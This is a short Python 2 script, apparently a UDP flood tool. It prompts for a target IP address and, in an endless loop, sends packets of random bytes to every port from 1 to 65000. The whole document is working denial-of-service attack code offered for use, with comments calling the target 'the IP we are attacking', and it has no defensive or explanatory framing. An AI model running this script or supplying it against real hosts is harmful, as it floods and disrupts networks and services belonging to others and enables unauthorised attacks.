import socket #Imports needed libraries
import random

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip=raw_input('Target IP: ') #The IP we are attacking

lower_port = 1
upper_port = 65000
sent = 0

while 1: #Infinitely loops sending packets to the port until the program is exited.
    port = lower_port
    try:
        while port < upper_port:
            sock.sendto(bytes,(ip,port))
            print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
            sent = sent + 1
            port += 1
    except:
        print "retrying"
